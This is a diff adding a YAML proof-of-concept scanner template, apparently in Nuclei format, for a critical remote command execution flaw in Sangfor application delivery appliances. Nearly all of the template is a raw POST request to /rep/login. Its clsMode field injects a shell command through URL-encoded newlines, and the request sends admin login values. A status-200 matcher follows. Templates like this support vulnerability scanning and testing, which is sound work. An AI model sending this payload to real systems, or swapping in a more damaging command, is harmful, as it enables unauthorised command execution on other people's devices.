@@ -1,0 +1,48 @@
+id: poc-dh0732nznsgl62zk
+info:
+  name: 深信服应用交付远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dh0732nznsgl62zk'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: dh0732nznsgl62zk
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /rep/login HTTP/1.1
+
+
+    Accept: */*
+
+
+    Connection: Keep-Alive
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    clsMode=cls_mode_login%0Als%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    etc
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
